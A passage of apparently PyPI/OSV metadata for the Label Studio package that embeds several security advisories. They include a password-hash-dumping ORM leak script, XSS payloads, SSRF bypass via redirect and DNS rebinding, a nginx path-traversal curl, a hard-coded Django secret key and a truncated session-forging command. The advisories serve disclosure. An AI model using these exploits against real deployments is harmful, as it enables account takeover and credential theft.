config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.9.0.post2":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.9.0.post2/","requires_dist":["pip (>=20.2.3)","appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.4.1)","certifi (==2019.11.28)","chardet (==3.0.4)","click (~=7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (>=4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","numpy (>=1.17.4)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (==2.22.0)","six (>=1.13.0)","srsly (>=0.2.0)","tqdm (>=4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","ordered-set (==4.0.2)","orjson (>=2.0.11)","rarfile (==3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","rq (>=1.0)","boto3 (>=1.12.32)","google-cloud-storage (==1.28.1)","flask-wtf (==0.14.3)","label-studio-converter (>=0.0.22)","htmlmin (==0.1.12)","gevent (>=20.6.2)","ujson (==3.0.0)","Colorama (==0.4.4)","boxing (==0.1.4)","pyyaml (>=5.3.1)"],"requires_python":">=3.5, <3.9","summary":"Label Studio annotation tool","version":"0.9.0.post2","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"7f32da8e6b279134e96c8b835bba3c20b8638473fed4f514b10472582258ae8b","md5":"3f852787b610678be30f71b4dfa5a5da","sha256":"1363a13887d6351b720c89c43be78d41d42fff1cee56cebdd4fbf60077668fb9"},"downloads":-1,"filename":"label_studio-0.9.0-2-py3-none-any.whl","has_sig":false,"md5_digest":"3f852787b610678be30f71b4dfa5a5da","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5, <3.9","size":18874883,"upload_time":"2021-01-14T02:47:21","upload_time_iso_8601":"2021-01-14T02:47:21.453209Z","url":"https://files.pythonhosted.org/packages/7f/32/da8e6b279134e96c8b835bba3c20b8638473fed4f514b10472582258ae8b/label_studio-0.9.0-2-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"fe7ca87d49ee025f3db6f0095808c74436145024a7b25fb2689e3b56fa0f3969","md5":"bea6f3b239d5b4e973dfeb2cd677e520","sha256":"d7aff1cde79b4b9efda1c3999f5f3854849e075b2c44a6e16f2806c67bdfd71f"},"downloads":-1,"filename":"label-studio-0.9.0-2.tar.gz","has_sig":false,"md5_digest":"bea6f3b239d5b4e973dfeb2cd677e520","packagetype":"sdist","python_version":"source","requires_python":">=3.5, <3.9","size":18707150,"upload_time":"2021-01-14T02:47:48","upload_time_iso_8601":"2021-01-14T02:47:48.736503Z","url":"https://files.pythonhosted.org/packages/fe/7c/a87d49ee025f3db6f0095808c74436145024a7b25fb2689e3b56fa0f3969/label-studio-0.9.0-2.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's 